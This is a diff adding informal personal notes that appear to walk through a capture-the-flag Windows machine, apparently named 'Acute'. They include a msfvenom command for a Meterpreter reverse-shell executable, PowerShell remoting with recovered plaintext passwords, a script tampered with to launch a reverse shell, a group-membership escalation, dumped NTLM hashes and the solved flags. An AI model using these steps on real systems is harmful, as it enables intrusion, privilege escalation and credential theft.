@@ -1,0 +1,63 @@
+This time ill be trying to only wirte the "important" things, like the main exploits or things to look for, step by step.
+Maybe ill write some commands i use
+
+USER OWN:
+	If the page is "https" check the certificate. Not allways works but sometimes you can find a few things
+
+	In the main page or ports look for names. Like "Who we work with", "Staff" or "Team names" it could give you a posible
+	dictionary to use with a login page.
+
+	If you can download some files read the whole documentation, maybe you can find some "points" that can be exploited latter.
+	Also analyze the file with exiftool.
+	E.g.	"exiftool -a -u -g1 MyFileToAnalyze" 
+	
+	Use a reverseshell. Sometimes also doing it with msf can be usefull :).
+	E.g.	" msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=myIP LPORT=myPort -f exe > shell.exe "
+	Also make sure that you load the right module.
+
+	On web powershell:
+	"""
+	$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+	$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
+
+	invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
+	"""
+
+	& thats how you get the user flag :D
+
+ROOT PRIV-ESC:
+	Search for some executable files like .exe, .com or .ps1 extensions and analyze them (it isn't hard to find one)
+	creat a symlink inside this file to execute your reverse shell 
+	"""
+	Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\REVERSESHELL') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
+	
+	invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1} -credential $cred
+	"""
+	
+	Check which groups of users you belong, idk maybe is admin ;).
+	Also don't forget to dump the hashes with the reverse shell session
+	And crack them, there is no use to an encrypted hash.
+
+	"""
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+	"""
+	
+	Also don't forget to bbe sure that u have all the usernames in a list, sometimes a few are missing.
+	Or use the password on different users if on the main don't work
+
+	"""
+	$passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
+	$cred = New-Object System.Management.Automation.PSCredential ("acute\awallace", $passwd)
+	invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
+	
+	Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
+	"""
+	Again, Search for any executable file, and read the content
+	Also search for the cronjobs and what kind of fyles are geting executed & by who
+FLAGS:
+	user: 129fbbee5834e4ca03e69928f444f465
+	root: 546307dbc1cb2d40b5e35e06a30cce0b
